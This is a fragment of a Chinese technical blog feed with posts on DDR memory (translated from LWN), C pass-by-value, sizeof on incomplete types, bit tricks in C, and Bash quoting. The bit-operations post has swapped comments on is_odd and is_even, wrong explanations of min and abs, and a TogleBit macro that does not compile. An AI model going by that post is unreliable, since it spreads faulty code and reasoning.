src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281223952.png"></p><p>为了获得更多的内存技术，DDR2包括了更多的创新。在图2.12中可以看到的最明显的变化是，总线频率翻倍了。频率翻倍意味着带宽翻倍。由于这种频率翻倍对于单元阵列来说并不经济，因此现在要求I&#x2F;O缓冲区每秒获得四个位，然后将其发送到总线上。这意味着对DDR2模块的更改仅涉及使DIMM的I&#x2F;O缓冲区组件能够以更高的速度运行。这当然是可能的，不会需要显著更多的能量，它只是一个小组件，而不是整个模块。市场营销人员为DDR2想出的名字与DDR1类似，只是在计算值时，将两倍的因素替换为四倍（我们现在有一个四倍泵送的总线）。</p><p>图2.13显示了今天使用的模块的名称。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281223745.png"></p><p>还有另一种命名方式。CPU、主板和DRAM模块使用的FSB速度是使用_有效_频率指定的。也就是说，它考虑了时钟周期的两个边沿的传输，从而提高了数字。因此，一个133MHz模块，有一个266MHz的总线，有一个533MHz的FSB“频率”。</p><p>DDR3（真正的一个，不是用于图形卡的假GDDR3）的规范要求更多的变化，类似于过渡到DDR2。电压将从DDR2的1.8V降低到DDR3的1.5V。由于功耗方程是使用电压的平方计算的，仅此一项就带来了30%的改进。加上减小的芯片尺寸以及其他电气进步，DDR3可以在相同的频率下，功耗减半。或者，使用更高的频率，可以击中相同的功率包络。或者，以双倍的容量实现相同的热量排放。DDR3模块的单元阵列将以外部总线速度的四分之一运行，需要一个8位I&#x2F;O缓冲区，而DDR2是4位。见图2.14以获取图解。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281224027.png"></p><p>最初，DDR3模块可能会有略高的CAS延迟，只是因为DDR2技术更成熟。这将导致DDR3只在频率高于DDR2可以实现的频率时才有用，并且即使在那时，主要在带宽比延迟更重要时。已经有关于1.3V模块的讨论，这些模块可以实现与DDR2相同的CAS延迟。在任何情况下，由于更快的总线可以实现更高的速度，这种可能性将超过增加的延迟。一个可能的问题是，对于1,600Mb&#x2F;s的传输速率或更高，每个通道的模块数量可能减少到只有一个。在早期版本中，这个要求适用于所有频率，所以人们希望这个要求最终能对所有频率取消。否则，系统的容量将受到严重限制。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281224818.png"></p><p>图2.15显示了预期的DDR3模块的名称。JEDEC到目前为止已经同意了前四种类型。鉴于Intel的45nm处理器具有1,600Mb&#x2F;s的FSB速度，1,866Mb&#x2F;s是超频市场所需的。我们可能会在DDR3生命周期的后半段看到更多这样的情况。</p><p>所有DDR内存都有一个问题：增加的总线频率使得创建并行数据总线变得困难。一个DDR2模块有240个引脚。所有连接到数据和地址引脚的连接必须布置得长度大致相同。更大的问题是，如果要在同一个总线上将多个DDR模块串联，每个额外的模块信号就会变得越来越失真。DDR2规范只允许每个总线（即通道）有两个模块，DDR3规范对于高频率只有一个模块。对于240个引脚的通道，一个单独的北桥合理地不能驱动超过两个通道。替代方案是拥有外部内存控制器（如图2.2所示），但这很昂贵。</p><p>这意味着商品主板被限制只能拥有最多四个DDR2或DDR3模块。这个限制严重限制了系统可以拥有的内存量。即使是旧的32位IA-32处理器也可以处理64GB的RAM，即使是家庭用途的内存需求也在增长，所以必须采取一些措施。</p><p>一种解决方案是将内存控制器添加到每个处理器中，如第2节所述。AMD在Opteron系列中这样做，Intel将使用他们的CSI技术。只要处理器能够使用的合理数量的内存可以连接到单个处理器，这就会有所帮助。在某些情况下，这不是情况，这种设置将引入NUMA架构及其负面影响。对于某些情况，需要另一种解决方案。</p><p>Intel对于大型服务器机器的解决方案，至少在未来几年内，称为全缓冲DRAM（FB-DRAM）。FB-DRAM模块使用与今天的DDR2模块相同的组件，这使得它们相对便宜地生产。不同之处在于与内存控制器的连接。FB-DRAM不是使用并行数据总线，而是使用串行总线（Rambus DRAM在那时也有这个，SATA是PATA的后继者，PCI Express是PCI&#x2F;AGP的后继者）。串行总线可以在更高的频率下驱动，抵消了串行化的负面影响，甚至增加了带宽。使用串行总线的主要效果是：</p><ol><li>每个通道可以使用更多的模块。</li><li>每个北桥&#x2F;内存控制器可以使用更多的通道。</li><li>串行总线被设计为全双工（两条线）。</li></ol><p>与双通道北桥的连接要求相比，FB-DRAM模块现在可以驱动6个通道，引脚数量更少：2×240引脚与6×69引脚。每个通道的路由要简单得多，这也可能有助于降低主板的成本。</p><p>全双工并行总线对于传统的DRAM模块来说是禁止的，复制所有这些线路太昂贵了。使用串行线路（即使它们是差分的，如FB-DRAM所要求的）就不是这样，因此串行总线被设计为全双工，这意味着在某些情况下，仅通过这一点，带宽理论上可以翻倍。但它不是用于增加带宽的唯一并行性使用地方。由于FB-DRAM控制器可以同时运行多达六个通道，即使对于系统内存量较小的情况，也可以通过使用FB-DRAM增加带宽。在DDR2系统上，如果四个模块有两个通道，那么相同的容量可以通过使用普通的FB-DRAM控制器通过四个通道来处理。串行总线的实际带宽取决于FB-DRAM模块上使用的DDR2（或DDR3）芯片的类型。</p><p>我们可以这样总结优点：</p><table><thead><tr><th></th><th>DDR2</th><th>FB-DRAM</th></tr></thead><tbody><tr><td>引脚</td><td>240</td><td>69</td></tr><tr><td>通道</td><td>2</td><td>6</td></tr><tr><td>每个通道的DIMMs</td><td>2</td><td>8</td></tr><tr><td>最大内存</td><td>16GB</td><td>192GB</td></tr><tr><td>吞吐量</td><td>~10GB&#x2F;s</td><td>~40GB&#x2F;s</td></tr></tbody></table><p>如果在一个通道上使用多个DIMMs，FB-DRAMs有一些缺点。信号在链中的每个DIMM上都会延迟——尽管是最小的——这意味着延迟会增加。但对于相同数量的内存和相同频率的FB-DRAM，由于每个通道只需要一个DIMM，它总是可以比DDR2和DDR3更快；对于大型内存系统，DDR使用商品组件根本没有办法。</p><p><strong>2.2.5 结论</strong></p><p>本节应该已经展示了访问DRAM不是任意快速的过程。至少不像处理器运行的速度那样快，以及它可以访问寄存器和缓存的速度。重要的是要记住CPU和内存频率之间的差异。一个运行在2.933GHz的Intel Core 2处理器和一个1.066GHz的FSB有一个11:1的时钟比率（注意：1.066GHz的总线是四倍泵送的）。内存总线上的每个周期的停顿意味着处理器的11个周期的停顿。对于大多数机器，实际使用的DRAMs更慢，因此增加了延迟。在接下来的部分中讨论停顿时，请记住这些数字。</p><p>读取命令的时序图表明，DRAM模块能够实现高持续的数据速率。整个DRAM行可以传输而不会产生单个停顿。数据总线可以100%保持占用。对于DDR模块，这意味着每个周期传输两个64位字。使用DDR2-800模块和两个通道，这意味着速率为12.8GB&#x2F;s。</p><p>但是，除非这样设计，DRAM访问并不总是顺序的。使用的是非连续的内存区域，这意味着需要预充电和新的RAS信号。这就是事情变慢的时候，当DRAM模块需要帮助时。预充电可以多快发生，RAS信号可以多快发送，当行实际使用时的惩罚就越小。</p><p>硬件和软件预取（见第6.3节）可以用来在时序上创建更多的重叠，并减少停顿。预取还有助于将内存操作在时间上移动，以便在稍后，即实际需要数据之前，减少竞争。当一轮产生的数据需要存储，而下一轮所需的数据需要读取时，这经常是一个问题。通过及时移动读取，写入和读取操作不必几乎同时发出。通过及时移动读取，写入和读取操作不必几乎同时发出。</p><h1 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h1><ul><li><a href="https://lwn.net/Articles/250967/">每个程序员都应该了解的内存知识-Part1</a></li><li><a href="https://lwn.net/Articles/253361/">OS Linux翻译的中文版</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言中引用传递的骗局</title>
    <link href="/2024/04/21/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%BC%95%E7%94%A8%E4%BC%A0%E9%80%92%E7%9A%84%E9%AA%97%E5%B1%80/"/>
    <url>/2024/04/21/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%BC%95%E7%94%A8%E4%BC%A0%E9%80%92%E7%9A%84%E9%AA%97%E5%B1%80/</url>
    
    <content type="html"><![CDATA[<p>C语言中的顺序点是什么情况？</p><span id="more"></span><p>在以前的 C 教科书上，一直教导我们， C 语言函数有两种传递参数的方式：值传递和引用传递。 但是，今天在看 <code>c-faq</code> 的 <code>4.11</code> 的时候，才了解到真相。其实严格意义上来讲， C 语言只有值传递，但是编译器可以模拟引用传递，但本质上，还是值传递。 举个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">int</span> *p)</span>;<br><span class="hljs-comment">//...</span><br><span class="hljs-type">int</span> i;<br>f(&amp;i);<br></code></pre></td></tr></table></figure><p>这是一个很正常的指针传递，我们一般把这个称为引用传递。对于整数 i 来说，确实是这样的，但是对于 <code>int</code> 指针来说， <code>f</code> 函数调用，只是把 i 的地址复制一份给 p ，这个行为其实是在传值。 可能这个例子不是很明显，那么引用一下 <code>c-faq</code> 上的一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">int</span> *p)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> dummy=<span class="hljs-number">5</span>;<br>    p=&amp;dummy;<br>&#125;<br><span class="hljs-comment">//...</span><br><span class="hljs-type">int</span> *i;<br>f(i);<br></code></pre></td></tr></table></figure><p>指针 <code>i</code> 在 <code>f</code> 函数调用后，是否改变了？答案是否，因为 <code>f(i)</code> 是一个传值，只是复制了一份 <code>i</code> 的值而已，尽管在 <code>f</code> 函数内部改变了，但是只是改变了 <code>i</code> 的复制版。这其实是 C 语言初学者，经常犯的错误，把传值理解为传地址。但是为什么还是有很多人在这个代码上，犯糊涂了？因为我们习惯上把传指针直接当作引用传递的替身了。</p><p><strong>其实，我们为了传递一个指针的引用，应该用指针的指针：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">int</span> **p)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> dummy=<span class="hljs-number">5</span>;<br>    *p=&amp;dummy;<br>&#125;<br><span class="hljs-comment">//...</span><br><span class="hljs-type">int</span> *i;<br>f(&amp;i);<br></code></pre></td></tr></table></figure><p>这样，对于指针 <code>**p</code> 来说， <code>f</code> 函数是传值，但是对于指针 <code>*p</code> 来说，其实是传地址，跟上面是一个道理。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://tinylab.org/c-faq4-8-ref-scam/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>c-faq</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于sizeof的特殊错误</title>
    <link href="/2024/04/21/%E5%85%B3%E4%BA%8Esizeof%E7%9A%84%E7%89%B9%E6%AE%8A%E9%94%99%E8%AF%AF/"/>
    <url>/2024/04/21/%E5%85%B3%E4%BA%8Esizeof%E7%9A%84%E7%89%B9%E6%AE%8A%E9%94%99%E8%AF%AF/</url>
    
    <content type="html"><![CDATA[<p>什么情况下sizeof宏无法计算数组的大小？</p><span id="more"></span><p><code>sizeof</code> 是 <code>C</code> 中的一个关键字，用来计算类型或者表达式的大小。</p><p>今天在看 <code>faq</code> 的时候，碰到一个问题，是说 <code>sizeof</code> 无法计算一个数组的大小，在编译的时候，就出现错误。不解，自己尝试着编写了一个例子，果然出现这个错误：</p><blockquote><p>错误： invalid application of ‘sizeof’ to incomplete type ‘int[]’</p></blockquote><p>例子如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">f1.h:<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[];<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> size;<br><span class="hljs-type">int</span> array2[<span class="hljs-number">10</span>];<br>f1.c:<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;f1.h&quot;</span></span><br><span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span> size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">array</span>);<br>f2.c:<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;f1.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TEST</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> array2[] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array: %d\n&quot;</span>, size);<br><span class="hljs-comment">//printf(&quot;array: %d\n&quot;, sizeof(array));</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array2: %d\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(array2));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，在 <code>f2.c</code> 中，第二个被注释的 <code>printf</code> 是编译不过去的，第三个正常。</p><p>WHY ？</p><p>因为 <code>sizeof</code> 是在编译的时候来处理每个对象的大小，而编译的时候是以一个文件 ( 编译单元 ) 为单位进行编译的。所以在处理一个编译单元的时候，编译器是无法从另外一个文件来获得一个非完全声明类型的大小的。这也是为什么错误提示中有一个 <code>incomplete type</code> 的字眼了。</p><p>那么，什么是 <code>incomplete type</code>?</p><p>在 <code>ISO-IEC 9899</code> 的标准文档的 <code>6.2.5 </code>中，是这样来定义类型的：</p><blockquote><p>The meaning of a value stored in an object or returned by a function is determined by the type of the expression used to access it. (An identifier declared to be an object is the simplest such expression; the type is specified in the declaration of the identifier.)<br><br>Types are partitioned into object types (types that describe objects) and function types (types that describe functions). At various points within a translation unit an object type may be incomplete (lacking sufficient information to determine the size of objects of that type) or complete (having sufficient information)</p></blockquote><p>从上可以看出类型被分为：对象类型、函数类型。而在一个翻译单元中，对象类型可能是完全的，或者非完全的。</p><p>也就是说非完全类型是对象类型的一个特殊类，而什么时候，一个对象类型是不完全的呢？</p><p>标准文档是这么说的：缺乏足够的信息来决定一个对象类型的大小</p><p>可能说这么多，大家有点迷糊了，下面引用一下 <code>IBM</code> 在 <code>XL C/C++ (V6.0)</code> 的规范文档中，把如下的类型归类为非完全类型：</p><ul><li>void 类型 <code>eg. void *ptr;</code></li><li>没有指明大小的数组 <code>eg. extern int array[];</code></li><li>数组中的元素是非完全类型</li><li>没有定义的结构体、<code>union</code> 和枚举类型 <code>eg. struct test;</code></li><li>没有定义的类指针;</li><li>只声明，无定义的类 <code>eg. class test;</code></li></ul><p>其实， <code>incomplete type</code> 一个经常的用处，那就是隐藏一些类型的细节，比如，在头文件中声明一个 <code>struct test;</code> ，然后其他程序如果要使用这个结构体，那就包含这个头文件，但是它们无法知道这个结构体内部的细节，也就无法访问结构体内部成员，当然，更加不能用 <code>sizeof</code> 。但是对于那些，只是做一个传递的外部函数，这些足够了。</p><p>所以，以后用 <code>sizeof</code> 的时候，还是注意一下。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://tinylab.org/c-faq1-24-sizeof/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>c-faq</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>详解位运算</title>
    <link href="/2024/04/20/%E8%AF%A6%E8%A7%A3%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    <url>/2024/04/20/%E8%AF%A6%E8%A7%A3%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
    
    <content type="html"><![CDATA[<p>详解C语言中的位运算。</p><span id="more"></span><h1 id="基本应用"><a href="#基本应用" class="headerlink" title="基本应用"></a>基本应用</h1><h2 id="判断奇偶"><a href="#判断奇偶" class="headerlink" title="判断奇偶"></a>判断奇偶</h2><p>思路：</p><blockquote><p>任何整数，如果是奇数，则转化为二进制数后，最后一位二进制位肯定为1，为偶数，则最后一位二进制位为0。利用这个性质，将任意整数x与1作与运算，如果结果为1，则x为奇数；结果为0，则x为0数。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">is_odd</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<span class="hljs-comment">//偶数</span><br>    <span class="hljs-keyword">return</span> x &amp; <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">is_even</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<span class="hljs-comment">//奇数</span><br>    <span class="hljs-keyword">return</span>!(x &amp; <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="交换两个数"><a href="#交换两个数" class="headerlink" title="交换两个数"></a>交换两个数</h2><p>思路：</p><blockquote><p>两个数a和b，可以用异或运算来交换它们的值。a^b的结果是a和b的不同位的组合，而a^b^a的结果是a和b的相同位的组合。利用这个性质，可以将a和b的值交换。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> *a, <span class="hljs-type">int</span> *b)</span> &#123;<br>    *a = *a ^ *b;<br>    *b = *a ^ *b;<br>    *a = *a ^ *b;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">交换前：a=<span class="hljs-number">3</span> b=<span class="hljs-number">6</span><br>交换后：a=<span class="hljs-number">6</span> b=<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="取绝对值"><a href="#取绝对值" class="headerlink" title="取绝对值"></a>取绝对值</h2><p>思路：</p><blockquote><p>任何整数的绝对值，可以用位运算来实现。如果整数x是正数，则x的绝对值等于x；如果整数x是负数，则x的绝对值等于其二进制表示的补码。利用这个性质，可以将任意整数x的绝对值取出来。</p></blockquote><div class="note note-warning">            <p>这个方法和类型紧密相关</p>          </div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">abs</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> mask = x &gt;&gt; <span class="hljs-number">31</span>; <span class="hljs-comment">// 右移31位，得到最右边的1</span><br>    <span class="hljs-keyword">return</span> (x + mask) ^ mask; <span class="hljs-comment">// 利用异或运算求绝对值</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="取最小值"><a href="#取最小值" class="headerlink" title="取最小值"></a>取最小值</h2><p>思路：</p><blockquote><p>两个整数的最小值，可以用位运算来实现。如果a和b都是正数，则它们的最小值等于a和b的按位与结果；如果a和b有一个为负数，则它们的最小值等于负数的绝对值与另一个数的按位与结果。利用这个性质，可以将任意两个整数的最小值取出来。</p></blockquote><div class="note note-warning">            <p>这个方法和类型紧密相关</p>          </div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">min</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>    <span class="hljs-type">int</span> mask = (a - b) &gt;&gt; <span class="hljs-number">31</span>; <span class="hljs-comment">// 右移31位，得到最右边的1</span><br>    <span class="hljs-keyword">return</span> (a &amp; ~mask) | (b &amp; mask); <span class="hljs-comment">// 利用按位与和按位或运算求最小值</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="操作位"><a href="#操作位" class="headerlink" title="操作位"></a>操作位</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BitVal(data,y) ( (data&gt;&gt;y) &amp; 1)             <span class="hljs-comment">// Return Data.Y value</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SetBit(data,y)    data |= (1 &lt;&lt; y)          <span class="hljs-comment">// Set Data.Y to 1</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ClearBit(data,y)  data &amp;= ~(1 &lt;&lt; y)         <span class="hljs-comment">// Clear Data.Y to 0</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TogleBit(data,y)     (data ^=BitVal(y))     <span class="hljs-comment">// Togle Data.Y value</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Togle(data)   (data =~data )                <span class="hljs-comment">// Togle Data value</span></span><br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://cshihong.github.io/2018/12/31/%E4%BD%8D%E8%BF%90%E7%AE%97%E7%9A%84%E5%A5%87%E5%B7%A7%E6%B7%AB%E6%8A%80/">位运算</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bash快捷键</title>
    <link href="/2024/04/20/Bash%20%E8%BD%AC%E4%B9%89%E5%92%8C%E5%BC%95%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/04/20/Bash%20%E8%BD%AC%E4%B9%89%E5%92%8C%E5%BC%95%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>BASH中的强符号和弱符号</p><span id="more"></span><p>字面量、转义和引号是任何编程语言的基础，但却少有人认真地学习 Bash 中的转义和 <a href="https://www.gnu.org/software/bash/manual/html_node/Quoting.html#Quoting">引号</a>。 好消息是 Bash 引号的语义非常简单，这篇文章就可以完全描述。 <strong>TL;DR</strong>：</p><ol><li>反斜线用来转义除换行之外的所有字符，反斜线加换行为连行;</li><li>单引号用来直出字面量，其内容部分不允许转义，包括单引号转义也不允许；</li><li>双引号内允许 <a href="https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html#Command-Substitution">命令替换</a> 和对特定几个字符转义，双引号内的反斜线对其他字符没有特殊含义，会被当作字面量处理。</li></ol><p>如果不熟悉 Bash 引号的语义，尤其是配合管道和 xargs 等命令时，事情会变得很复杂很难以理解。 比如下面的命令把 16 进制 ASCII 转为字符串 <code>harttle</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>echo<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#x27;\\x68\\x61\\x72\\x74\\x74\\x6c\\x65&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> | xargs <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>-0<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>printf<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#x27;%b&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果没有加引号或没有加 <code>-0</code> 都不会得到正确的结果，二者都会影响参数如何转义。 在介绍完规则后我们重新来看这个例子。</p><p>Bash（Posix）转义规则很简单：</p><p>一、<strong>反斜线用来保持字面量</strong>。Bash 里反斜线用来转义下一个字符，保持下一个字符的字面值。 比如 <code>\$</code> 表示字面量 <code>$</code>，否则如果没有反斜线 <code>$</code> 会被 <a href="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html#Shell-Parameter-Expansion">Bash 参数展开</a>。 例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># echo 将收到字面量 \x68\x61\x72\x74\x74\x6c\x65，下一个字符 \ 被保持</span><br><span class="hljs-comment"># 输出 harttle</span><br><span class="hljs-built_in">echo</span> \\x68\\x61\\x72\\x74\\x74\\x6c\\x65<br><br><span class="hljs-comment"># echo 将收到字面量 x68x61x72x74x74x6cx65，下一个字符 x 被保持</span><br><span class="hljs-comment"># 输出：x68x61x72x74x74x6cx65</span><br><span class="hljs-built_in">echo</span> \x68\x61\x72\x74\x74\x6c\x65<br></code></pre></td></tr></table></figure><p>注意 Shell 只负责处理参数和调用命令，不会识别 <code>\t</code>, <code>\n</code>，<code>\x68</code> 等其他编程语言里的 ASCII 特殊字符，这些特殊字符的处理通常在具体的软件中，比如 <code>echo</code>, <code>printf</code> 等。 例如下面的命令会输出 <code>a b</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;a\tb&#x27;</span><br></code></pre></td></tr></table></figure><p>但 <code>\t</code> 的语义并不是由 Shell 表达的，Shell 只是把这个长度为 4 的字符串 <code>&quot;a\tb&quot;</code> 传递给 <code>echo</code> 程序，后者将会收到参数 <code>argv[1] === &quot;a\\tb&quot;</code>。</p><p>二、<strong>反斜线+换行例外</strong>。反斜线后一个字符是换行（<code>&lt;NL&gt;</code>）时上一条规则例外。 这时 <code>\&lt;NL&gt;</code> 表示连行，一个命令可以分行写。换句话说 <code>\&lt;NL&gt;</code> 等效于会在解析时删除。 比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> log.txt |\<br>grep a |\<br>grep b<br><span class="hljs-comment"># 等价于</span><br><span class="hljs-built_in">cat</span> log.txt | grep a | grep b<br></code></pre></td></tr></table></figure><p>单引号用来保持引用内容的所有字面量，包括反斜线。也就是说一对单引号中不得出现单引号，它前面有反斜线也不行。 例如下面的命令将会输出 <code>harttle</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># echo 将收到字面量 \x68\x61\x72\x74\x74\x6c\x65</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;\x68\x61\x72\x74\x74\x6c\x65&#x27;</span><br></code></pre></td></tr></table></figure><p>如果单引号之间出现单引号，引用内容立即结束（来自其他编程语言的同学注意）。 比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;foo\&#x27;</span>bar<span class="hljs-string">&#x27;   # 回车</span><br><span class="hljs-string"></span><br><span 